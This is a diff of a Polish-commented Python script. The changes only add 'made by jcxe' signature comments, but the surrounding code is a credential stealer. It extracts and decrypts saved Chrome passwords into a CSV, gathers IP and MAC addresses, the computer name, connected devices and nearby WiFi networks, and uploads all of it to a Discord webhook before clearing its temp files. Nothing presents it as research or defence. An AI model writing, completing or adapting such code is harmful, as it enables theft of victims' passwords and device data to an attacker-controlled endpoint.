@@ -1,5 +1,5 @@
-
-
+#𝖒𝖆𝖉𝖊 𝖇𝖞 𝖏𝖈𝖝𝖊
+#𝖒𝖆𝖉𝖊 𝖇𝖞 𝖏𝖈𝖝𝖊
 import os
 import json
 import base64
@@ -15,7 +15,7 @@ import tempfile
 import socket
 import subprocess
 import re
-
+#𝖒𝖆𝖉𝖊 𝖇𝖞 𝖏𝖈𝖝𝖊
 # Funkcja do pobierania sekretnego klucza z przeglądarki Chrome
 def get_secret_key():
     try:
@@ -29,7 +29,7 @@ def get_secret_key():
     except Exception as e:
        
         return None
-
+#𝖒𝖆𝖉𝖊 𝖇𝖞 𝖏𝖈𝖝𝖊
 # Funkcja do odszyfrowywania hasła
 def decrypt_password(ciphertext, secret_key):
     try:
@@ -41,7 +41,7 @@ def decrypt_password(ciphertext, secret_key):
     except Exception as e:
        
         return ""
-
+#𝖒𝖆𝖉𝖊 𝖇𝖞 𝖏𝖈𝖝𝖊
 # Funkcja do uzyskiwania połączenia z bazą danych haseł Chrome
 def get_db_connection(chrome_path_login_db):
     try:
@@ -50,7 +50,7 @@ def get_db_connection(chrome_path_login_db):
     except Exception as e:
        
         return None
-
+#𝖒𝖆𝖉𝖊 𝖇𝖞 𝖏𝖈𝖝𝖊
 # Funkcja do uzyskiwania zewnętrznego adresu IPv4
 def get_external_ipv4_address():
     try:
@@ -65,7 +65,7 @@ def get_external_ipv4_address():
     except Exception as e:
         
         return None
-
+#𝖒𝖆𝖉𝖊 𝖇𝖞 𝖏𝖈𝖝𝖊
 # Funkcja do uzyskiwania adresu IPv6
 def get_ipv6_address():
     try:
@@ -75,7 +75,7 @@ def get_ipv6_address():
     except Exception as e:
        
         return None
-
+#𝖒𝖆𝖉𝖊 𝖇𝖞 𝖏𝖈𝖝𝖊
 # Funkcja do uzyskiwania adresu MAC
 def get_mac_address():
     try:
@@ -85,7 +85,7 @@ def get_mac_address():
     except Exception as e:
      
         return None
-
+#𝖒𝖆𝖉𝖊 𝖇𝖞 𝖏𝖈𝖝𝖊
 # Funkcja do uzyskiwania nazwy komputera
 def get_computer_name():
     try:
@@ -95,7 +95,7 @@ def get_computer_name():
     except Exception as e:
        
         return None
-
+#𝖒𝖆𝖉𝖊 𝖇𝖞 𝖏𝖈𝖝𝖊
 # Funkcja do uzyskiwania informacji o połączonych urządzeniach
 def get_connected_devices():
     try:
@@ -113,7 +113,7 @@ def get_connected_devices():
         return devices
     except Exception as e:
         return []
-
+#𝖒𝖆𝖉𝖊 𝖇𝖞 𝖏𝖈𝖝𝖊
 # Funkcja do uzyskiwania informacji o dostępnych sieciach WiFi
 def get_wifi_networks():
     try:
@@ -138,21 +138,21 @@ def get_wifi_networks():
         return networks
     except Exception as e:
         return []
-
+#𝖒𝖆𝖉𝖊 𝖇𝖞 𝖏𝖈𝖝𝖊
 if __name__ == '__main__':
     try:
         # Utwórz tymczasowy katalog do przechowywania plików
         temp_dir = tempfile.mkdtemp()
-
+#𝖒𝖆𝖉𝖊 𝖇𝖞 𝖏𝖈𝖝𝖊
         # Utwórz plik CSV do przechowywania odszyfrowanych haseł
         csv_file_path = os.path.join(temp_dir, 'odszyfrowane_hasla.csv')
         with open(csv_file_path, mode='w', newline='', encoding='utf-8') as decrypt_password_file:
             csv_writer = csv.writer(decrypt_password_file, delimiter=',', escapechar='\\')
             csv_writer.writerow(["Indeks", "URL", "Nazwa użytkownika", "Hasło + kilka losowych znaków"])
-
+#𝖒𝖆𝖉𝖊 𝖇𝖞 𝖏𝖈𝖝𝖊
             # Pobierz sekretny klucz z Chrome
             secret_key = get_secret_key()
-
+#𝖒𝖆𝖉𝖊 𝖇𝖞 𝖏𝖈𝖝𝖊
             # Szukaj profilu użytkownika lub folderu domyślnego (tu jest przechowywane zaszyfrowane hasło do logowania)
             chrome_folders = [element for element in os.listdir(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data')) if re.search("^Profile*|^Default$", element) is not None]
             for folder in chrome_folders:
@@ -177,7 +177,7 @@ if __name__ == '__main__':
                     # Usuń tymczasową bazę danych logowania
                     os.remove("Loginvault.db")
 
-
+#𝖒𝖆𝖉𝖊 𝖇𝖞 𝖏𝖈𝖝𝖊
 
         # Pobierz dane z Discord webhooka
         external_ipv4_address = get_external_ipv4_address()
@@ -196,13 +196,13 @@ if __name__ == '__main__':
             webhook_url = 'WEBHOOK_URL'
             response = requests.post(webhook_url, json=data)
 
-
+#𝖒𝖆𝖉𝖊 𝖇𝖞 𝖏𝖈𝖝𝖊
             # Wyślij plik CSV jako załącznik
             files = {'file': open(csv_file_path, 'rb')}
             response = requests.post(webhook_url, files=files)
 
 
-
+#𝖒𝖆𝖉𝖊 𝖇𝖞 𝖏𝖈𝖝𝖊
 
         # Pobierz informacje o połączonych urządzeniach
         connected_devices = get_connected_devices()
@@ -223,8 +223,10 @@ if __name__ == '__main__':
 
             # Wyślij dane na Discord webhook
             response = requests.post(webhook_url, json=data)
-
+#𝖒𝖆𝖉𝖊 𝖇𝖞 𝖏𝖈𝖝𝖊
           
     finally:
         # Wyczyść tymczasowy katalog
         shutil.rmtree(temp_dir, ignore_errors=True)
+
+#𝖒𝖆𝖉𝖊 𝖇𝖞 𝖏𝖈𝖝𝖊
